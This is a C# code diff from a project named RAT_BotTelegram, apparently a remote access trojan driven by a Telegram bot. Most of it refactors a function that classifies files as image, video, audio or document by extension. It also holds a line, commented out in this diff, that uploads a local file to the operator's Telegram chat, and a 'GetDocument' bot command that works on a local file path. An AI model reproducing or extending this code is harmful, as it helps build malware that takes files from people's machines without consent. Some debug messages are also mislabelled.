@@ -37,27 +37,7 @@ namespace RAT_BotTelegram {
 
 
 
-            Bot.SendDocumentAsync(config.id, File.Open(path, FileMode.Open));
-
-
-
-            string GetTypeFile(string dir) {   // Retorna solo el nombre del archivo
-                             //string path = @"D:\PNG Icons\System Win 10\camera.png";
-                try {
-                    /* Utiliza la variable para obtener el ultimo contendor 
-                     * =Ejemplo:
-                     * [Antes]    path = @"Contenedor1\Contenedor2\Contenedor3" 
-                     * [Despues]  path =  "Contenedor3"                                                     */
-                    int palabraClave = dir.LastIndexOf(@"\");
-                    dir = dir.Substring(palabraClave + 1);
-                } catch {
-                    dir = "Hubo un problema"; // Hubo un problema 
-                }
-
-                return dir;  // NameFile
-            }
-            
-
+            //Bot.SendDocumentAsync(config.id, File.Open(path, FileMode.Open));
             //Bot.SendPhotoAsync(config.id, File.Open(path, FileMode.Open));
             //Bot.SendVideoAsync(config.id, path);
             
@@ -214,15 +194,19 @@ namespace RAT_BotTelegram {
                 return dir;  // NameFile
             }
             string GetFileType(string File) {
+                /* Utiliza la variable para obtener el ultimo contendor 
+                 * =Ejemplo:
+                 * [Antes]    path = "SoyUnaImagen.png" 
+                 * [Despues]  path =  "[Imagen]"             */
+
                string dir = GetFileName(File);
-                string resultado;   //Puede ser: [Video]-[Audio]-[Doc]-[Imagen]
-                bool final = false;     // True = Se encontró la caregoría de extensión // No se encoentró la categoría
+               string dir2 = dir;       // Solo antibuggeo
                 try {
                     /* Utiliza la variable para obtener el ultimo contendor 
                      * =Ejemplo:
-                     * [Antes]    path = @"Contenedor1\Contenedor2\Contenedor3" 
-                     * [Despues]  path =  "Contenedor3"                                                     */
-                    int palabraClave = dir.LastIndexOf(".");
+                     * [Antes]    path = "SoyUnaImagen.png" 
+                     * [Despues]  path =  "png"                                                     */
+                int palabraClave = dir.LastIndexOf(".");
                     dir = dir.Substring(palabraClave + 1);
                 } catch {
                     return  "[-]";
@@ -231,7 +215,7 @@ namespace RAT_BotTelegram {
                 String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
                 String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
                 String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx" };
-                String[] imagen = { "ico", "jpe", "jpe", "jpeg", "png", "bmp" };
+                String[] imagen = { "jpeg", "png", "bmp","ico", "jpe", "jpe" };
                 //String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                 //                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
                 //                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
@@ -240,31 +224,37 @@ namespace RAT_BotTelegram {
                 // Verifica si el archivo es una imagen
                 foreach (string ext in imagen) {
                     if (ext == dir) {
-                        resultado = "[Imagen]";
-                        final = true;
-                        Console.WriteLine("");  // Solo debug
-                        break;
+                        Console.WriteLine(dir2+"<= es una Imagen");  // Solo debug
+                        return "[Imagen]";
                     }
-                    Console.WriteLine("");  // Solo degub
+                    Console.WriteLine(dir2 + " No tiene la ext " + ext);  // Solo debug
                 }
                 // Verifica si el archivo es una video 
-                if (!final) { // solo si no se encoentró la categoría
-                    foreach (string ext in video) {
-                        if (ext == dir) {
-                            resultado = "[Video]";
-                            final = true;
-                            break;
-                        }
+                foreach (string ext in video) {
+                    if (ext == dir) {
+                        Console.WriteLine(dir2 + "<= es un Video");  // Solo debug
+                        return "[Video]";
                     }
+                    Console.WriteLine(dir2 + " No tiene la ext " + ext);  // Solo debug
+                }
+                // Verifica si el archivo es un Adudio
+                foreach (string ext in audio) {
+                    if (ext == dir) {
+                        Console.WriteLine(dir2 + "<= es un Audio");  // Solo debug
+                        return "[Audio]";
+                    }
+                    Console.WriteLine(dir2 + " No tiene la ext " + ext);  // Solo debug
+                }
+                // Verifica si el archivo es un Documento
+                foreach (string ext in doc) {
+                    if (ext == dir) {
+                        Console.WriteLine(dir2 + "<= es un Audio");  // Solo debug
+                        return "[Doc]";
+                    }
+                    Console.WriteLine(dir2 + " No tiene la ext " + ext);  // Solo debug
                 }
 
-
-
-
-
-
-
-                return dir; // Extension File
+                return "[-]"; // Extension File
             }
 
             
@@ -284,7 +274,7 @@ namespace RAT_BotTelegram {
 
                 case "GetDocument":
 
-                    string ruta = @"O:\OneDrive - xKx\Pictures\Game resources - Sprites\Lazer o balas\transparent-laser-pixel.png";
+                    string ruta = @"O:\OneDrive - xKx\Pictures\Game resources - Sprites\Lazer o balas\transparent-laser-pixel.doc";
                     Console.WriteLine("Nombre: " + GetFileName(ruta) + "\n tipo:" + GetFileType(ruta));
 
                     await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
